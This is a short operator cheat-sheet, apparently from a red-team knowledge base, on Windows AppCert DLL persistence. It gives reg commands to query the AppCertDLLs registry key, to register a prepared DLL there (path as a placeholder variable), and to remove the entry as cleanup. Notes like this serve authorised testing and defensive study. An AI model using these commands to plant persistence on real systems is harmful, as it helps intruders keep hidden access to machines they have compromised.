---
technique: AppCert DLL Persistence
category: persistence
targets: Windows Process Creation
protocols: Local
remote_capable: false
tags: windows persistence appcert dll registry
---

# AppCert DLL Persistence

AppCert DLL persistence loads configured DLLs into processes that call process creation APIs.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Admin registry access | AppCert DLLs are configured under HKLM |
| Prepared DLL | Payload construction belongs in a tool or payload note |
| Process creation trigger | DLL loads when processes create child processes |

## Windows

### Query AppCert DLLs

#cmd #registry #appcert

Query AppCert DLL configuration.

```cmd title:"Query AppCert DLLs"
reg query "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDLLs"
```
<!-- cheat -->

### Add AppCert DLL

#cmd #registry #appcert

Register a prepared DLL as an AppCert DLL.

```cmd title:"Register AppCert DLL"
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDLLs" /v "$value_name" /t REG_EXPAND_SZ /d "$dll_path" /f
```
<!-- cheat
var value_name
var dll_path
-->

### Remove AppCert DLL

#cmd #registry #cleanup

Remove an AppCert DLL registry value.

```cmd title:"Remove AppCert DLL"
reg delete "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDLLs" /v "$value_name" /f
```
<!-- cheat
var value_name
-->

## Linux

No Linux operator command is included here. This note covers Windows AppCert DLL persistence.
